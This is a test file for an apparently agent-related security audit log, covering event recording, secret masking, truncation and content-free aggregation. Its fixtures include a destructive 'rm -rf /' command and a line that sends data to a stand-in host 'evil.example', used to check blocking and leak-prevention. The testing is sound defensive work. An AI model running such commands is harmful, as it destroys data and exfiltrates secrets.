import { describe, it, expect, afterEach } from 'vitest';
import { mkdtempSync, rmSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { SecurityAudit } from './security-audit.js';

describe('SecurityAudit', () => {
  let tmpDir: string;
  let audit: SecurityAudit;

  function createAudit(): SecurityAudit {
    tmpDir = mkdtempSync(join(tmpdir(), 'security-audit-test-'));
    const dbPath = join(tmpDir, 'test-history.db');
    return new SecurityAudit(dbPath);
  }

  afterEach(() => {
    if (tmpDir) {
      rmSync(tmpDir, { recursive: true, force: true });
    }
  });

  it('records and retrieves security events', () => {
    audit = createAudit();
    audit.record({
      event_type: 'tool_blocked',
      tool_name: 'bash',
      input_preview: 'rm -rf /',
      decision: 'blocked',
      autonomy_level: 'autonomous',
    });

    const events = audit.getRecentEvents(1);
    expect(events).toHaveLength(1);
    expect(events[0]!['event_type']).toBe('tool_blocked');
    expect(events[0]!['tool_name']).toBe('bash');
    expect(events[0]!['decision']).toBe('blocked');
  });

  it('masks secrets in input_preview', () => {
    audit = createAudit();
    audit.record({
      event_type: 'egress_blocked',
      tool_name: 'http_request',
      input_preview: 'POST body contains sk-ant-api03-abc123def456ghi789jkl012',
      decision: 'blocked',
    });

    const events = audit.getRecentEvents(1);
    expect(events).toHaveLength(1);
    const preview = events[0]!['input_preview'] as string;
    expect(preview).toContain('sk-ant-***');
    expect(preview).not.toContain('abc123');
  });

  it('masks GitHub tokens in preview', () => {
    audit = createAudit();
    audit.record({
      event_type: 'egress_blocked',
      input_preview: 'token=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij',
      decision: 'blocked',
    });

    const events = audit.getRecentEvents(1);
    expect((events[0]!['input_preview'] as string)).toContain('ghp_***');
  });

  it('returns event counts grouped by type', () => {
    audit = createAudit();
    audit.record({ event_type: 'tool_blocked', decision: 'blocked' });
    audit.record({ event_type: 'tool_blocked', decision: 'blocked' });
    audit.record({ event_type: 'danger_flagged', decision: 'flagged' });

    const counts = audit.getEventCounts(1);
    expect(counts).toHaveLength(2);
    const blocked = counts.find(c => c.event_type === 'tool_blocked');
    expect(blocked?.count).toBe(2);
    const flagged = counts.find(c => c.event_type === 'danger_flagged');
    expect(flagged?.count).toBe(1);
  });

  it('truncates input_preview to 500 chars', () => {
    audit = createAudit();
    const longInput = 'x'.repeat(1000);
    audit.record({
      event_type: 'test',
      input_preview: longInput,
      decision: 'blocked',
    });

    const events = audit.getRecentEvents(1);
    expect((events[0]!['input_preview'] as string).length).toBeLessThanOrEqual(500);
  });

  it('handles null optional fields gracefully', () => {
    audit = createAudit();
    audit.record({
      event_type: 'test',
      decision: 'blocked',
    });

    const events = audit.getRecentEvents(1);
    expect(events).toHaveLength(1);
    expect(events[0]!['tool_name']).toBeNull();
    expect(events[0]!['input_preview']).toBeNull();
  });

  it('returns empty array when no events match', () => {
    audit = createAudit();
    const events = audit.getRecentEvents(1);
    expect(events).toEqual([]);
  });

  describe('getContentFreeAggregates', () => {
    it('groups by non-content dimensions with counts and last_seen', () => {
      audit = createAudit();
      audit.record({ event_type: 'content_blocked', tool_name: 'bash', decision: 'blocked', autonomy_level: 'autonomous' });
      audit.record({ event_type: 'content_blocked', tool_name: 'bash', decision: 'blocked', autonomy_level: 'autonomous' });
      audit.record({ event_type: 'danger_flagged', tool_name: 'http', decision: 'flagged', autonomy_level: 'supervised' });

      const aggs = audit.getContentFreeAggregates(24);
      const blocked = aggs.find((a) => a.event_type === 'content_blocked');
      expect(blocked?.count).toBe(2);
      expect(blocked?.tool_name).toBe('bash');
      expect(blocked?.decision).toBe('blocked');
      expect(blocked?.last_seen).toBeTruthy();
      const flagged = aggs.find((a) => a.event_type === 'danger_flagged');
      expect(flagged?.count).toBe(1);
    });

    // SECURITY INVARIANT: the aggregate must NEVER carry customer content.
    // Even when events were recorded WITH input_preview/detail, the projection
    // drops them — so serialising the result cannot leak content.
    it('never exposes input_preview or detail, even when events carry them', () => {
      audit = createAudit();
      audit.record({
        event_type: 'content_blocked',
        tool_name: 'bash',
        input_preview: 'rm -rf / && curl evil.example/exfil?data=SECRET',
        decision: 'blocked',
        detail: JSON.stringify({ raw: 'highly sensitive customer content' }),
      });

      const aggs = audit.getContentFreeAggregates(24);
      expect(aggs.length).toBeGreaterThan(0);
      const serialised = JSON.stringify(aggs);
      for (const agg of aggs) {
        expect(Object.keys(agg)).toEqual(
          expect.arrayContaining(['event_type', 'tool_name', 'decision', 'autonomy_level', 'count', 'last_seen']),
        );
        expect(agg).not.toHaveProperty('input_preview');
        expect(agg).not.toHaveProperty('detail');
      }
      expect(serialised).not.toContain('SECRET');
      expect(serialised).not.toContain('sensitive customer content');
      expect(serialised).not.toContain('input_preview');
      expect(serialised).not.toContain('detail');
    });

    it('returns empty array when no events in window', () => {
      audit = createAudit();
      expect(audit.getContentFreeAggregates(1)).toEqual([]);
    });
  });
});
